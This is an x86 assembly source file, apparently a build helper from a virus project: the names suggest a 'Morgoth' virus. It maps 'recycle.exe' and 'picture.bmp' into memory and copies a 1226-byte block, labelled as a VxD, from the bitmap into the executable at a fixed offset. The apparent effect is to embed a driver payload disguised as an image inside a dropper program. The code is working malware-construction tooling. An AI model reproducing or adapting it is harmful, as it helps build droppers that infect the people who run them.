   ;dropping the bmp into recycle.exe
   .386
   .model flat

   EXTRN ExitProcess:Proc
   EXTRN CreateFileA:Proc
   EXTRN CreateFileMappingA:Proc
   EXTRN MapViewOfFile:Proc
   EXTRN CloseHandle:Proc
   EXTRN UnmapViewOfFile:Proc

   vxdfilesize equ 1226
   morgothsize equ 2000h
   dropoffset  equ 0f6eh

   .data

   filename1   db "recycle.exe",0
   filename2   db "picture.bmp",0
   filehandle1 dd 0
   filehandle2 dd 0
   maphandle1  dd 0
   maphandle2  dd 0
   mapaddress1 dd 0
   mapaddress2 dd 0

   .code

   start:

   push 0
   push 0
   push 3
   push 0
   push 1
   push 80000000h + 40000000h
   push offset filename1
   call CreateFileA
   cmp eax,0ffffffffh
   je exit_here
   mov dword ptr filehandle1,eax

   push 0
   push morgothsize
   push 0
   push 4
   push 0
   push dword ptr filehandle1
   call CreateFileMappingA
   mov dword ptr maphandle1,eax

   push morgothsize
   push 0
   push 0
   push 2
   push dword ptr maphandle1
   call MapViewOfFile
   mov dword ptr mapaddress1,eax



   push 0
   push 0
   push 3
   push 0
   push 1
   push 80000000h + 40000000h
   push offset filename2
   call CreateFileA
   cmp eax,0ffffffffh
   je exit_here
   mov dword ptr filehandle2,eax

   push 0
   push vxdfilesize
   push 0
   push 4
   push 0
   push dword ptr filehandle2
   call CreateFileMappingA
   mov dword ptr maphandle2,eax

   push vxdfilesize
   push 0
   push 0
   push 2
   push dword ptr maphandle2
   call MapViewOfFile
   mov dword ptr mapaddress2,eax


   mov esi,dword ptr mapaddress2
   mov edi,dword ptr mapaddress1
   add edi,dropoffset
   mov ecx,vxdfilesize
   rep movsb


   push dword ptr [mapaddress1]
   call UnmapViewOfFile

   push dword ptr [maphandle1]
   call CloseHandle

   push dword ptr [filehandle1]
   call CloseHandle

   push dword ptr [mapaddress2]
   call UnmapViewOfFile

   push dword ptr [maphandle2]
   call CloseHandle

   push dword ptr [filehandle2]
   call CloseHandle

   exit_here:

   push 0
   call ExitProcess

   end start
